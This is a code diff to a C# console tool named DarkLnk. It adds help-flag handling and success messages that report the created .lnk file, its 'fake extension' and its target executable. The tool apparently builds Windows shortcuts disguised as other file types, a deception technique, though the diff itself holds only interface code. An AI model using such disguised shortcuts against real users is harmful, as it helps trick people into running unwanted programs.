@@ -14,11 +14,21 @@ namespace DarkLnk
         {
             try
             {
+                if (args.Length == 0 || (args.Length == 1 && (args[0] == "-h" || args[0] == "--help")))
+                {
+                    ShowHelp();
+                    return;
+                }
+
                 ParseArgs(args);
                 dl.BuildLink();
                 
                 Console.WriteLine();
-                Console.WriteLine("Operation completed successfully!");
+                Console.WriteLine($"Operation completed successfully!");
+                Console.WriteLine($"Created: .\\{dl.OutputName}.lnk");
+                Console.WriteLine($"Fake extension: {dl.LinkExtension}");
+                Console.WriteLine($"Target executable: {dl.Binary}");
+                Console.WriteLine();
                 Console.WriteLine("Press any key to exit...");
                 Console.ReadKey();
             }
